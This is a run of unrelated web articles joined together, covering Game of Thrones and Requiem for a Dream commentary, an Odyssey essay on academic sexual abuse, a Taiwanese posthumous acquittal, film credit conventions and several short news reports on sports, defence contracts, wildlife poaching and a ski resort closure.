Ah yes, Tyrion's greatest flaw—well, besides the fact he “killed his mother” in childbirth (digression: This is a world where people remarry within days or weeks to forge new alliances. Must we really be that hung up on poor Mrs. Lannister?)—is that he pays for sex and hangs out with sellswords. Never mind that just down the hall, on the Iron Throne, sits Tywin's grandson Joffrey, an actual “spiteful little creature” who is the product of incest, who started a war with the rash decision to behead Ned Stark, and whose ex-fiancee lives in fear of him raping her. It's Tyrion who dishonors the family name.
What's odd about all this is that Tywin is most often levelheaded, and even pragmatic. Last season, he put a stop to his men killing prisoners at Harrenhal in order to put them to work. And he quickly deduced that the young girl who'd he'd chosen as his cupbearer was tough and clever and worthy of his respect (though fortunately he never quite figured out she was Arya Stark). So his inability to see past Tyrion's physical deformities and minor weaknesses says more about him than it does Tyrion.
“A Lannister always pays his debts.” Unless, that is, the debt is owed to another Lannister.

1. Ellen Burstyn made the cinematographer cry.
One of the most heartbreaking scenes in the movie (or any movie for that matter) is when Sarah Goldfarb breaks down in front of her son when he comes to visit. Ellen Burstyn delivers an absolutely incredible monologue which easily should have won her the oscar which instead went to Julia Roberts for Erin Brockovich…that still pisses me off. If you watch that scene keep a close eye on the framing of Sarah, you'll notice it's not quite right. That's because Ellen Burstyn's performance made the cinematographer Matthew Libatique cry and fog up the camera's eyepiece.
2. Jared Leto and Marlon Wayans didn't eat sugar or have sex for a month.
The performances in director Darren Aronofsky's movies are always incredible, from Mickey Rourke and Marisa Tomei in The Wrestler to Natalie Portman in Black Swan. For Requiem for a Dream he wanted the actors to truly portray the feeling of craving. For this he asked actors Jared Leto and Marlon Wayans to follow the Tappy Tibbons routine and not eat any sugar, not eat red meat or have sex for 30 days.
Now that's the face of someone who needs to get laid.
3. Ellen Burstyn says that Sarah Goldfarb is her greatest acting achievement.
In February 2001 Ellen Burstyn was on the Charlie Rose show and said that playing Sarah Goldfarb in Requiem for a Dream is her best acting achievement. Not that she hasn't had so many incredible roles (she has 417 roles to date on her IMDB), but I have to agree that this is her best performance of her long career.
Also her most fucked up role…
4. Christopher McDonald shot all his part in one day.
Christopher McDonald (that's shooter McGavin to you) is a very versatile actor with roles in Happy Gilmore and…um, Happy Gilmore. I'm kidding! The guy has 181 acting credits on IMDB. In Requiem for a Dream he plays Tappy Tibbons, an infomercial host preaching 3 rules to success: 1) No red meat. 2) No refined sugar. 3) No Orgasms. He appears in Requiem on TV and in one particularly messed up drug induced dream sequence:
He's great in the role. And what's surprising is that he shot all of it in one day! At the end of his shooting day all of the crew and the crowd extras gave him a standing ovation. “We got a winner, I said we got a winner!”
5. Ellen Burstyn wore a lot of prosthetics for her role.
While it might not seem like it, but Ellen Burstyn wore a lot of prosthetics and makeup for her role as Sarah Goldfarb, I mean a lot of prosthetics! She had to wear 4 different necks, 2 fat suits, and 9 different wigs. If you watch the scene where she is staring at the refrigerator through split screen you'll notice her hand is up around her face:
That is actually to hide to seem of the fake neck she was wearing.
6. Oranges are bad.
This might be less of a Requiem for a Dream fact and more a movie in general fact, but oranges are a bad omen. It all stared with the The Godfather where oranges indicate death or danger. In the DVD commentary, Godfather director Francis For Coppola says, “It all started out as an accident, but once we realized we had used oranges so frequently in the first movie, we used them purposefully in the others.” After that many movies made a nod to oranges, and tv shows as well. Breaking Bad anyone:
Requiem for a Dream makes the same nod. The truck that Harry and Tyrone try to get drugs from at the supermarket is an orange truck. I mean the dude is actually peeling oranges in the middle of a drug buy for no reason.
I wonder how that worked out for everyone:
7. Aronofsky bought the rights to a movie to recreate two shots.
In requiem for a Dream there is a beautiful overhead shot of Marion in her bathtub, which then cuts to an underwater shot of her face as she screams. It's a gorgeous couple of shots. How did Darren Aronofsky come up with it? Well, he didn't. It's actually from a Japanese animated movie called Perfect Blue:
picture source
Darren Aronofsky actually bought the remake rights to the movie so he could use those two shots.
8. Aronofsky's dad is in the movie.
During a heartbreaking scene a strung out Sarah Goldfarb is on a train asking, “Does this train go to Madison Avenue?” One man on the train stands up and says, “You're whacked!”
Well that man just happens to be the directors father. He also put his mom in the movie as one of the women sunbathing outside the apartments.
Editor's Note This is one in a series of posts on the common readings in Stanford's 1980s “Western Culture” course. You can see all posts in the series here: Readings in Western Culture.
Whose story does the Odyssey tell? The answer seems obvious enough: from its first line, the eponymous epic tells the story of “the man of many turns” (as Albert Cook translated it), the story of “a complicated man” (as Emily Wilson translated it), the story of Odysseus, favored of Athena, goddess of wisdom.
But it tells many other stories too, and, much unlike the Iliad, which is a tale of men in conflict and companionship with other men, the Odyssey is very much a tale of men and women in conflict and companionship with one another. It is as if the pastoral world of human life awhirl upon the god-forged shield of Achilleus flowed through the poet's voice and on its current carried the hero home, where everybody knows your name.
Still, it is not just the story of Odysseus, the man, the husband, the father, the patriarch – it is the story of his family. There is the brooding, moody Telemachus, stewing in his frustration, angry at his mother, dangerously close to souring into Hamlet territory – tragic, yes, but not at all heroic.
And there is Penelope, wife of Odysseus and mother of Telemachus, beset by suitors who daily devour the wealth of Odysseus's household as they attempt to “woo” Odysseus's wife. If she is not a widow, she might as well be, for neither wise Mentor nor the few pious councilmen of Ithaca can protect Penelope from the many suitors' incessant pestering—or if they can, they don't. Meanwhile, Odysseus's father, old Laertes, has secluded himself in grief for his lost son, while Odysseus's son has yet to prove himself man enough to guard the safety of his mother.
The Odyssey is Penelope's story too, and it reads so differently in this #MeToo moment.
Surviving in the patriarchy without a male protector is no easy task. In Odysseus's long absence, Penelope is getting propositioned every day by men who don't respect her agency. That's what it amounts to. Penelope, within her own domestic sphere – the workplace of a Greek noblewoman – is enduring daily harassment as one man after another asks her to share his bed, to be his wife. But that's not what she wants. She wants Odysseus back home, and she will wait – for eighteen, nineteen, twenty years – however long it takes.
This is why she has not returned to her father's house. For to do so would be to admit that Odysseus is never coming home, to admit to widowhood, and thus to make herself marriageable.
So Penelope has the unenviable job of trying to persevere in a space she wants to hold open for her own future, and her family's future. Her strategy for survival is to humor the “suitors” who daily proposition her without either yielding to them or refusing them outright. For as long as each man thinks he has some hope of having her, no man will allow another to take her by force. That is her only gambit.
The suitors seem to believe that she enjoys it – she enjoys being the object of their desire, the recipient of all their propositioning.
Antinous slut-shames Penelope to her own son:
“…She is cunning.
It is the third year, soon it will be four,
that she has cheated us of what we want.
She offers hope to all, sends notes to each,
but all the while her mind moves somewhere else.” (II, 90-95)
That bitch. She likes the attention, but she won't put out.
Her very refusal makes her all the more desirable – a prize to win. What woman does not wish to be desired? And even if Penelope married at 14 or 15, she is an old matron now. In fact, she might be well into her forties, for she is on her twentieth year of waiting for her husband to come home. Is that what they want? Penelope the MILF? Penelope as happy, taken Madame George?
They want Penelope for her mind. Each man among them wants to be the master and the center of her thoughts.
Antinous has enough self-knowledge to know that. He tells frustrated Telemachus,
“Athena blessed her with intelligence,
great artistry and skill, a finer mind
than anyone has ever had before,
even the braided girls of ancient Greece,
Tyro, Alcmene, garlanded Mycene –
none of them had Penelope's understanding.
But if she wants to go on hurting us,
her plans are contrary to destiny.
We suitors will keep eating up your wealth,
and livelihood, as long as she pursues
this plan the gods have put inside her heart.
For her it may be glory, but for you,
pure loss. We will not go back to our farms
or anywhere, until she picks a husband.” (II, 116-129)
I read these lines, beautifully rendered by Emily Wilson, on the same day that I read The New Republic‘s deeply researched, damning article, “A Professor is Kind of Like a Priest.” Using the recently publicized cases of Franco Moretti and Jay Fliegelman, both professors in the English department at Stanford, the essay explores how academics departments deal with the rumored or confirmed abusers in their midst.
In that essay you can read the details of how the English department at Stanford dealt with Fliegelman, who raped his PhD student, Seo-Young Chu. There were professors in that department who, when they learned of it, took action and brought the charge to the university's administration. But there were professors in that department who closed ranks around Fliegelman:
Consent is slippery in a space as hierarchical as academia. Even if training for sexual assault prevention and awareness is strengthened, it will have to contend with a pre-existing culture defined by vastly unequal levels of power. On Fliegelman, [former Stanford PhD student James] Marino said, “It became immediately obvious to me that it was not to discuss this with faculty. It was clear that some faculty members supported him very deeply—some were angry.” As one professor told him, “These are supposed to be the enlightened guys, but they stick together like the fucking mafia.”
When I read Marino's observation, I immediately recognized the dynamic – not just at Stanford, but at every place in academe: enlightened guys who stick together like the fucking mafia to protect the privilege of predation. (The Chronicle, it seems, is seeking to crowd-source a list of capos and dons and embark on its own de facto Title IX investigations.)
But what I found most striking in the article – and there's much that's striking in it, I assure you – was this paragraph:
That Fliegelman offered “genuine intellectual help,” that he had “professional skills,” that he was “brilliant,” as we heard from one former graduate student after another, reveals one of the tragic ironies of Fliegelman's predatory behavior. Prospective academics were forced to choose between their careers, sense of ethics, physical safety, and psychological well-being, while the “brilliance” of predators in power often overshadowed the brilliance of those without it. Marino, who had been Chu's peer at Stanford, observes that media accounts of her story rarely note that she “was arguably the brightest student” among the graduate students. “She had the edge over a bunch of really smart students,” [emeritus Professor Herbert] Lindenberger told us. “She was just brilliant.”
She was just brilliant. And instead of nurturing a brilliance that might some day outshine his own, Fliegelman sought to possess it – to possess her, the student with the liveliest mind, the student with the brightest future – for himself.
Athena blessed her with intelligence,
great artistry and skill, a finer mind
than anyone has ever had before…
In spite of what she suffered, Seo-Young Chu is brilliant still, and she has a brilliant future in academe.
Jay Fliegelman does not. He is forever tarnished, forever dimmed, forever overshadowed by his own penchant to possess and put down women who outshone him and outshine him still.
To the wise, the gods are just.

A military court yesterday acquitted Chiang Kuo-ching (江國慶), who was executed for the rape and murder of a girl 15 years ago, in a posthumous trial.
Chiang was executed in 1997 after being convicted of sexually abusing and murdering a five-year-old girl.
The Military Northern District Court yesterday morning handed down the ruling after the Military Supreme Court Prosecutors' Office filed an extraordinary appeal with the Military Supreme Court in May last year to reopen the case.
The Military Supreme Prosecutors' Office's legal action followed findings by the Control Yuan that Chiang had been tortured by military investigators.
The Ministry of National Defense yesterday said it was the final verdict and it would help Chiang's family apply for national compensation.
The ministry said the court ruled that Chiang's statements were made against his will and that the blood-soaked toilet paper and knife used as evidence against Chiang were re-examined by forensic experts, who concluded that they could not prove Chiang's involvement in the murder.
Shen Shih-wei (沈世偉), an official with the ministry's Judicial Department, visited Chiang's mother Wang Tsai-lien (王彩蓮) at her apartment yesterday afternoon and delivered a copy of the ruling.
Wang's attorney Greg Yo (尤伯祥) and two other attorneys were in the court to hear the ruling.
Yo said Chiang's family is expected to receive about NT$100 million (US$3.3 million) in compensation.
Yo, who also represented the Judicial Reform Foundation, called on Taipei district prosecutors to quickly complete an investigation into the role and responsibility of former minister of national defense Chen Chao-min (陳肇敏) and other military officers in the wrongful execution.
Yo said Chen was the mastermind behind the botched investigation of Chiang's case.
In an interview in the morning, Wang said: “I will bring the acquittal ruling to my son and my husband's shrines.”
She added she would not forgive those military officials responsible and wanted to see the verdicts against former air force counterintelligence official Ko Chung-ching (柯仲慶) and others.
The Supreme Prosecutors' Office Special Investigation Division concluded on May 24 that Chiang, who was serving in the air force command in 1996 at the time of the murder, was not guilty of the crime.
Chiang was executed at the age of 21.
The Supreme Prosecutors' Office has since charged a new suspect, Hsu Jung-chou (許榮洲), with the girl's murder.
Prosecutors said Chiang was tortured during questioning, including exposure to strong lights and being forced to watch a video of the girl's autopsy. He was also threatened with an electric prod and deprived of sleep while being forced to undergo strenuous physical activities.
Prosecutors said Hsu left bloody palm prints at the scene of the crime, which a DNA test confirmed were his.
Hsu's case is pending in the Taipei District Court.
The Consumer Financial Protection Bureau (CFPB) is a great resource for consumers, but its days may be numbered. Take advantage of one of its best features while you still can: it has a massive database of detailed complaints from bank and credit union customers.
The database has given customers a platform to complain about their experiences with financial institutions and according to the CFPB's website, here's how it works:
Each week we send thousands of consumers' complaints about financial products and services to companies for response. Those complaints are published here after the company responds or after 15 days, whichever comes first. By adding their voice, consumers help improve the financial marketplace.
Advertisement
Financial institutions don't like this, of course, because they say there's no guarantee the complaints are accurate (even though there is a field for the company's response, and 97% of complaints get a response). Basically, if you're a bank that takes advantage of customers, you probably don't like this database, because it gives those customers a platform to call you out.
For a consumer, though, it's a pretty valuable platform to see what potential issues you might have. Customer narratives, like the one below, help tip off the CFPB to illegal business practices, like the whole Wells Fargo fiasco last year. Thanks to the CFPB and their database, Wells Fargo put a stop to opening unauthorized accounts. Even better, they were forced to refund customers the fees they racked up in those unauthorized accounts.

With the database in danger of disappearing, it's a good time to take advantage of it if you haven't already. If you're thinking of switching banks or credit unions, research the information while you still can. You can download the data, too.

Leicester City have moved to bolster their wide options with the deadline day signing of Nathan Dyer from Swansea City on a season-long loan.
- Nathan Dyer joins Leicester City on a season-long loan from Swansea City
- Dyer has more than 130 Premier League appearances to his name
- The 27-year-old becomes City's seventh signing of the summer
Leicester City have moved to bolster their wide options with the deadline day signing of Nathan Dyer from Swansea City on a season-long loan.
Subject to Premier League, Football Association and international clearance, the 27-year-old winger becomes City's seventh signing of the summer transfer window.
Dyer has spent the last six years in South Wales, during which time he helped Swansea win promotion from the Sky Bet Championship, the Capital One Cup and become an established force in the Barclays Premier League.
With pace, creativity and versatility, Dyer has proven himself to be a considerable attacking threat down either flank in the top flight for Swansea in recent seasons, and will be keen to continue that trend with the Foxes.

Robert Healy sent us a picture of a green box that he's seen throughout the city.
Canberra is home to more than a hundred locked metal boxes, mounted on short poles.
Robert Healy of Calwell has been spotting the little green boxes for years.
"Once you notice one, you start to notice them everywhere," he said.
"I've never been able to work out what they're for. There's no sign on them, no writing… they just appear in odd places."
The retired public servant asked Curious Canberra to look into the green and sometimes grey boxes, and his question won our February voting round.
External Link: Listen to the story
I'd seen the boxes Robert was asking about, they stand about a metre tall and can be found beside roads and on median strips.
Robert hadn't just been wondering about the boxes - he'd been photographing them too.
He emailed through a few examples, which helped me track down the person with the key to the boxes in question.
One box opened
Share Questioner Robert Healy peers into one of the city's mysterious roadside boxes.
Robert and I met Pawel Potapowicz from Roads ACT beside a metal box on Pialligo Avenue, near Queanbeyan.
"We had that question asked before," Pawel said.
"[People have asked] is there a radar in there? Is it taking pictures?"
With a key in hand, the member of the traffic management and safety unit crouched down to unlock the rusty box we had come to see.
Robert and I peered inside.
"They're actually empty, there's nothing inside," Pawel said.
Share A multi-pin connector can be found inside the box.
The box isn't completely empty though and we find a black power cable that runs down the length of the pole and into the ground.
At the other end is a round multi-pin connector. It plugs into a brick-like device that Pawel pulls from a canvas bag.
A device from the '70s
Share When in use, the metal boxes contained a traffic counting device.
With the device plugged in and neatly stored in the box, the purpose of the unusual structures is almost revealed.
"The main idea is that they're always located on the major arterial road network," Pawel said.
"They would collect information on the vehicles coming into the ACT and leaving the ACT. They would also collect information on vehicles going into and out of town centres."
Pawel believes they routinely puzzle Canberrans because all of their technology remains hidden.
The counter inside the box monitors traffic flow and type by tapping into sensors that are buried in the road.
"Every time a vehicle drives over it, the sensors detect that and measures the speed and volume," Pawel explained.
Share Pawel Potapowicz from Roads ACT handles one of the traffic logging devices.
The boxes were originally installed by the National Capital Development Commission (NCDC) in the 1970's.
But even in their heyday, many of the metal boxes remained empty.
"We would basically put the device in certain units and then the device would be removed, the data collected and they would be circulated through the other boxes," Pawel said.
Disappearing fixtures
These days traffic monitoring technology is more portable, economical and accurate too.
At the bottom of the metal box we're inspecting we find a rectangular device that's is connected to two black tubes that stretch across the road.
Share Today Roads ACT uses portable rubber tubes to monitor traffic.
"They're basically rubber loops with air inside and every time a vehicle drives over them the impulse gets sent to the box and gets recorded with a very simple computer," Pawel explained.
The loops work in a similar way to the buried sensors and the data goes on to be interpreted by software.
Robert's question is timely because the boxes are being decommissioned.
"It is gradually happening over time because there's so many of them," Pawel confirms.
"I would say in the next two or three years you probably won't see them anymore."
But eagle-eyed Canberrans may still spot them elsewhere, in New South Wales and Victoria.
The technology is still used in places where traffic is constantly monitored and in busy locations where the installation of temporary traffic monitors is considered too dangerous.

Opening Credits: Who, What, Where, When and Why
Written by Peter Bohush | Posted by: NewEnglandFilm.com
Opening credits are a functional as well as creative part of movies. Telling the audience who is in the movie, as well as other known talent such as writers, directors and composers, sets the stage for what's to come. Check out an example here.
With a hundred years of moviemaking history, there must be a “standard” way of listing people in the opening credits, right? Wrong. Except for the contractual or union-mandated billing, the rest of the opening credits have no rules.
Many great movies had no opening credits, such as The Godfather and Apocalypse Now. Citizen Kane opens with only the title of the movie, saving all the credits for the end.
Most movies in the 1930s through 1950s listed lots of cast and crew in the opening credits, often in a sort of Playbill format as if the movie was a filmed stage play. Today, high-powered talent demand specific types of onscreen billing in their contracts.
Although it's common today for blockbuster movies to open with just the title and no other front credits, it is reported that George Lucas was fined $250,000 by the Directors Guild of America for not putting the director's name (his) in the opening credits.
Independent, non-union movies aren't bound by union rules for opening credits, so anything goes. However, over the past two decades an order of listing cast and crew has become widely accepted by Hollywood studio and independent productions.
When the lights dim and the movie begins, the opening credits will be presented in the following manner:
STUDIO OR DISTRIBUTION COMPANY presents
This is the distributor. It may be a studio or independent distribution company. It may or may not have financed the making of the movie. But it is the company that sold the movie into theaters, television, DVD, etc. Sometimes it is listed in the same text as the rest of the credits. Or it could be a logo or even a standalone clip, such as the MGM lion roaring.
THE PRODUCTION COMPANY
Usually a movie is produced under a business entity that finances motion pictures. It may be an independent company, a studio or a subsidiary. The director or producer's personal production company may also have acquired the source material, such as a book or play, upon which the movie is based, and could get a production company credit here as well.
IN ASSOCIATION WITH SO-AND-SO PRODUCTION COMPANY
There may be multiple production companies that played a part in getting the movie made. They are listed here, after the distributor and the primary production company, studio or studio subsidiary.
A DIRECTOR'S NAME FILM (or Producer's)
Audiences today are used to seeing the director's name before the movie title, as the auteur or visionary of the movie. Some directors have developed such a well-known style that audiences will have specific expectations when seeing his or her name in front of the title. There's a difference between a Tarantino film and a Michael Bay film.
If the director simply worked for hire without developing it from his early vision, it's kind of silly to make the auteur claim here. Sometimes the executive producer claims the film's style and vision. Tim Burton has with movies he produced but did not direct, such as Abraham Lincoln: Vampire Hunter and Batman Forever.
THE MOVIE STARS
Anywhere from one to three lead actors are often listed just before the title. It's a similar position to the auteur, as the presence of these star actors is the reason many people came to see the movie.
True movie stars transcend their producers and directors. One may think of a Tarantino film, or a Spielberg movie or Coen Brothers picture. But more likely, people are there to see a Brad Pitt, George Clooney, Meryl Streep or Robert DeNiro movie, regardless of who produced and directed it.
Their names are listed before the movie's title, which is equivalent to having their names above the title in the movie poster. This is where the term “top billing” originated.
THE TITLE
Now the title of the movie, by itself in big letters.
THE TOP CAST
After the title, the leading actors are presented, either with their names singly on their own “title cards,” or sometimes in twos or threes on the screen together, if the actors have more or less the same size parts or are of equal status.
SUPPORTING CAST
Other actors get listed next, if they have significant parts (several scenes) or they are recognizable names. Often several actors will be listed together on the same title card.
THE “WITH” ACTOR
An actor or actress of some renown may have a small part in the movie. He or she might get a “with” credit here, such as “with Margot Thespian.”
Often these credits go to actors who “used to be” somebody years ago, still have a recognizable name, but are no longer box office draws.
THE “AND” ACTOR
A step up from the “with” acting credit, the final title card for the cast is reserved for the actor who has a meaty part in the movie, but not a leading role. It's like, wow, isn't it amazing that Big Actor blessed this movie with his presence, and I bet he's gonna be great!
It's where the elder statesman is listed, the uber-star. Many times the character's name is listed here as well, such as “And Sam Elliott as The Stranger” from The Big Lebowski
That's the production companies and the cast. Now for the crew.
CASTING DIRECTOR
Who brings all the great acting talent together for this movie? Sometimes the producers, sometimes powerful talent agencies package their clients into a movie. More likely a casting director puts the cast together, if not the lead actors then all the supporting players.
Casting Directors can be members of the Teamsters union and may also belong to a professional organization such as CSA, the Casting Society of America.
Mix-n-Match the following…
The order of listings in the next section of production people is less rigid. Some movies with big special effects might put the Visual Effects Supervisor first, followed by the others in this section. Some movies don't list the VFX Supervisor until the end credits if the job was minimal.
Regardless of the order, most movies today include the following listings in their opening credits. They are usually listed singly on their own title cards, but not always.
MUSIC COMPOSER
May be listed as Music Composed by, or Original Score by, or even just Music by.
If the movie includes a vocal song, perhaps performed by a well-known artist or group, this is sometimes included as part of this title card.
PRODUCTION DESIGNER
The Production Designer is responsible for the overall physical look and feel of the movie. He or she works to achieve the director's vision of the sets, locations, costumes, hair, makeup, special effects, colors and tone.
ART DIRECTOR
The Art Director oversees set design and construction, decorating or set dressing, props, signage and modifying locations. Sometimes the art director is pushed to the end credits.
SET DESIGN
If a movie makes use of lots of sets, as opposed to on-location shooting, the Set Designer may be listed in the opening credits, although this is sometimes another one of the credits that gets rolled at the end of the movie.
COSTUME DESIGNER
Someone designs the clothes for all the actors, makes or buys them, or at least guides the actors if they're bringing their own modern-day wardrobe on low-budget productions. Certainly their work is evident in period or sci-fi movies, but even modern-day films need the skills of a talented costume designer to make the actors look good, and right for their parts.
HAIR / MAKE-UP ARTISTS
Movie stars are beautiful people, no one can argue that. They tone, tan, sculpt and starve their bodies to be the people everyone else in the world wants to look like. However, truth be told, to look their best on camera they need makeup and hair stylists.
Makeup is sometimes listed in the opening credits if the movie relies on makeup for special effects or advanced aging of a lead character. Think Planet of the Apes, Benjamin Button or even Forrest Gump.
Lots of stars have their own personal hair and makeup artists. When there are several of these, most of the time they are listed in the end credits and not in the opening.
SOUND RECORDING
The Sound Recordist is hardly ever noted in the opening credits anymore. Few producers or directors even know just what the sound people do, from recordists, mixers, editors to designers. So they usually get listed in the end credits, despite the fact that movies are a combination of picture AND sound.
VISUAL EFFECTS SUPERVISOR
It's not just Harry Potter or Transformers movies that utilize visual effects, or VFX. A movie may contain dozens of VFX shots that the audience never notices, such as digitally changing license plates on cars or signs on walls, or making it look like the scene was shot in New York instead of on a street in Hollywood.
Or even digitally removing a pimple from an actor's face that makeup couldn't hide. These are all visual effects, along with the spaceships, demons, monsters and fantasy worlds.
The VFX Supervisor will work on-set with the director and director of photography to help set up shots that will be digitally manipulated in post-production. During the post phase, the VFX Supervisor will oversee all the specialists who work on the digital shots, such as animators, compositors, rotoscopers and graphic artists.
EDITOR
The Editor takes the pieces of film or digital files and assembles them into the story that becomes the movie. He or she makes the editorial decisions about which shots to use, often in conjunction with the director, producer and studio executives.
DIRECTOR OF PHOTOGRAPHY
The DP heads up the camera crew. He or she will oversee the lighting, camera set ups, lens choices, filters, equipment and sometimes even the framing of all the shots, depending on the director. The DP is essentially 2nd in command on the set, beneath the director.
Sometimes the cinematographer is listed earlier in the credits. Typically he or she is listed just before the producers, writers and director.
EXECUTIVE PRODUCER
Producer titles have become extremely ambiguous. The Producers Guild of America has been trying to standardize the roles of the different types of producers, and even limit the number of producers eligible to be considered for Academy Awards.
Historically, the Executive Producer was the person who put the project in motion, either by acquiring the rights to a book or play or person's life story, or by financing the production or bringing together the financing from investors or a studio.
The EP often does not participate in the day-to-day production of the movie, but may oversee Producers who do.
PRODUCER(S)
The Producer runs the operation of the movie — making hiring decisions, budget planning and expending, and supervising the cast and crew from pre-production to production and through post-production.
In addition to the Producer, there may also be Co-Producers, Line-Producers, Supervising Producers and Production Supervisors. These have defined roles (at least theoretically) by the Producers Guild, a trade organization.
Associate Producers are supposed to be sort of junior producers. Above an assistant, with some specific production responsibilities, but without full authority. However, in practice over the years, the Associate Producer credit has been handed out like candy as a perk to whoever the Producer wants or needs to give it. Girlfriends, mistresses, lazy nephews and entourage hangers-on have been named associate producers.
BASED ON THE BOOK (PLAY, GRAPHIC NOVEL etc.) BY
If the movie is based on another artistic work. This credit is often listed underneath and in smaller font size than the screenwriter.
STORY BY
Someone may have come up with the original story but didn't write the screenplay, or wrote it with another writer. This credit acknowledges the contribution of the scenarist.
WRITTEN BY
The Writers Guild of America, West, dictates that the screenwriting credit shall be Written By, instead of Screenplay By.
There can only be up to three writers credited for the screenplay. However, a writing team is considered “one” credit, so in practice there can be more than three names in the Written By credit.
In the case of multiple writers working on the screenplay (at different times, usually), the names are listed chronologically from top to bottom. The original writer would be credited first, and below him or her the subsequent writers.
When teams are involved, the WGAw helps identify them through the use of “and” versus an ampersand. For example, if John Smith and Jane Doe worked together as a team, and then Frank Fellow was hired later to polish up the script, their credits would be listed as follows:
Written by
John Smith & Jane Doe
and
Frank Fellow
The ampersand indicates that John and Jane worked as a team, while Frank wrote alone and on a subsequent draft from John and Jane's.
DIRECTED BY
The Directors Guild of America (DGA) permits a movie to list only one director, even if two or more worked on it. A team is considered one directing credit, such as Directed by Joel and Ethan Coen.
Except in very rare cases, such as the death of a director during production, only one directing credit is listed.
The Wizard of Oz had five directors, including Richard Thorpe, the original who was fired after two weeks, George Cukor, who is a sort of babysat the production briefly until Victor Fleming was assigned. Fleming directed most of the movie, until he left to direct Gone With The Wind upon which King Vidor came aboard to finish, directing the Kansas scenes and Producer Mervyn LeRoy later directed some pick-up shots.
But only Victor Fleming got the directing credit. Because just like a ship can have only one captain and a kitchen one chef, a movie can (usually) have only one director.
And once the director's name shows on screen, it's time to start the movie.
Rare and endangered animals, along with their habitats, are being threatened by poachers and photographers when details of their locations are published online, scientists have said.
New research published in the journal Science warned that more than 20 newly-described species and their habitats had been targeted through open-access location data.
Lead authors from the Australian National University David Lindenmayer said some animals had been killed and others had been placed on the market as pets.
The targeted species include a legless lizard found in the ACT and the Chinese cave gecko from south-eastern China.
Professor Lindenmayer has urged other researchers and industry publications worldwide to withhold or mask location details.
"Wildlife poachers are able to access online reports and publications at a click of a button. In the past it could only be accessed through hard copies and library basements," he said.
"In some cases, as soon as some animals are described, they can be poached to extinction in the wild.
"This is an issue that is going to emerge even more with online open-access data.
"It is obvious that we need to do more work to make sure that the locations of these animals [are] not easily accessible to the wrong kinds of people."
Wildlife snappers part of the problem
But Professor Lindenmayer said it was not just wildlife poachers causing the problem - nature photographers often caused devastating damage to the animals' habitats.
"Often when people want to take photographs of animals they severely disturb their behaviour or they smash up their habitat, or both," he said.
"Often it can mean that these animals are so badly disturbed that essentially they either die or the habitats are uninhabitable.
"That is almost as bad as poaching."
According to Professor Lindenmayer, people in Australia were trespassing on private property days after research was published online on the pink tail worm lizard.
"It didn't take long before we started getting phone calls from landowners saying they had people digging up the rocky areas where they live," he said.
The research urges the scientific community to self-censor, recognising the damage publicly available information could do.
"This is only going to get worse unless governments and other bodies take action to make sure that rare and threatened species are better protected in terms of their location data," Professor Lindenmayer said.
"This is in the hands of the editors of these journals, and in the hands of the people that are scientists who publish this information."

Nov. 10 (UPI) -- Pentagon officials announced Thursday that Lockheed Martin Aeronautics has been awarded a contract for weapons technology and development support on the F-35 Lightning II joint strike fighter and small-diameter bomb II for the U.S. Marine Corps and Air Force.
The deal is estimated to be worth more than $34.6 million and is classified as a cost-plus-fixed-fee contract -- where Lockheed Martin will be reimbursed by the U.S. government on a negotiated fee that is fixed before the contract is set in stone.
Defense Department officials are enabling Lockheed to develop "weapons capabilities technology maturation and risk reduction pre-engineering, manufacturing and development activities," according to a Pentagon statement.
In July, Lockheed Martin was awarded a $5.6 billion contract modification to an existing contract for Lot 11 low-rate acquisition of the F-35 Lightning II fighter.
That contract called for the procurement needs of the the Air Force, Marine Corps, Navy, allied nations and customers under the foreign military sales program, which provides for 74 Fiscal 2017 aircraft, including 48 F-35As for the Air Force, 19 F-35Bs for the Marine Corps, and eight F-35Cs for the Navy and Marine Corps.
Raytheon announced last month that it has already started integrating the SDB-II system on the F-35, F/A-18E/F and F-15E aircraft.
Work on Thursday's contract announcement will be performed in Fort Worth, Texas, and is expected to be completed in July 2018, according to Pentagon officials.
Fiscal 2017 research, development, test and evaluation funds for the U.S. Marine Corps and U.S. Air Force in the amount of $6 million are being obligated at the time of award, all of which, the Pentagon said, will expire at the end of the current fiscal year.

The resort will shut down immediately. Its summer season, set to open yesterday (Thursday), was cut down.
The 2012-13 winter season will not happen at all, leaving the lifts idle and employees scrambling to find work.
The news came as a “complete surprise” to June Lake's incoming county supervisor, Tim Alpers. He was in Southern California on business when he found out.
“I was wondering why my phone started ringing off the hook,” he said. “When my wife, Pam told me, I thought maybe I misheard her. Then, I saw Connie Black (the owner of June Lake's award-winning Double Eagle Resort and Spa) had called and I knew it was bad.”
What made the news worse was the abruptness.
“I'm concerned about the complete lack of warning,” he said. “I think we need to call a special board of supervisors meeting, a town hall meeting, we need to look at the lease, we need to see if there are any options at all, see if any entrepreneurs might be willing to look at buying it. This is going to be absolutely devastating to the whole community.”
Alpers was not the only one caught off-guard.
“A lot of people are going to be out of work,” said Black, who said she is the second largest employer in June Lake (after Mammoth Mountain), with about 80 employees on the payroll. “This is a real blow to the June Lake community.”
“We are all talking among ourselves, we are wondering how the community is going to absorb this kind of impact. Do we say, ok, this is the way it is, or do we put our heads together and try to figure out a way to change this.
“We've lost a lot of people in the past few years. If we keep going this way, June Lake would be a ghost town.
“Right now, we just don't have enough information to know what the facts are but we are going to find out.”
It came down to a business decision for Mammoth Mountain, CEO Rusty Gregory said in a press release.
“June has operated at an annual deficit each year since its purchase in 1986,” he said.
“It is time to invest some of this subsidy into the analysis and planning required to position the resort for a sustainable future, then secure the approvals and financing required to create it.”
Elsewhere in the press release, communications director Joani Lynch said in the weeks to come, Mammoth Mountain will be working to determine if and to what extent it can absorb June's year round workforce, which suffered 75 layoffs this season as a result of a low-snow year.
June was heavily subsidized by Mammoth Mountain.
Mammoth purchased June Mountain in 1986 with the idea of significantly increasing the size of the resort by building new facilities, extending new runs to the June Lake Village, and fostering additional developed ski areas along the San Joaquin Ridge, resulting in a connection between Mammoth and June Mountains, she wrote in the release.
“For a number of reasons, these plans were never realized and June Mountain has, in turn, suffered from an identity crisis that has both stifled its ability to achieve its full potential and required substantial financial subsidy from Mammoth on an annual basis.
“Cessation of operations will help the company dedicate its focus to a new future for June Mountain. Mammoth will be working with its partner the U.S. Forest Service to reach the best possible result in this endeavor.”
The state Board of Elections is investigating.
PROVIDENCE, R.I. — A half-dozen past and present Providence police officers may have committed a felony by registering to vote from the police station's address: 325 Washington St.
Providence Police Commissioner Steven M. Paré says the officers with whom he spoke — including one who actually lives and votes in Massachusetts — told him they have "no idea" how they landed on the capital city's voter rolls at that address.
